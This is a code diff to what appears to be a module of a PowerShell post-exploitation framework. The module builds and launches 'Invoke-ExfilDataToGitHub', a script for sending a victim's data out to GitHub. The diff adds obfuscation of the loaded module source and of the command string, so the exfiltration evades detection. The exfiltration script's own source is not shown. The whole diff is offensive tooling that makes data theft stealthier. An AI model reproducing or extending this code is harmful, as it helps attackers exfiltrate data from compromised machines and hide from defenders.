@@ -114,11 +114,14 @@ class Module:
                     self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         # if you're reading in a large, external script that might be updates,
         #   use the pattern below
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1"
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -131,7 +134,7 @@ class Module:
         script = moduleCode
 
         # Need to actually run the module that has been loaded
-        script += 'Invoke-ExfilDataToGitHub'
+        scriptEnd = 'Invoke-ExfilDataToGitHub'
 
         # add any arguments to the end execution of the script
         for option,values in self.options.iteritems():
@@ -139,8 +142,10 @@ class Module:
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
                         # if we're just adding a switch
-                        script += " -" + str(option)
+                        scriptEnd += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " \"" + str(values['Value']) + "\""
-
+                        scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
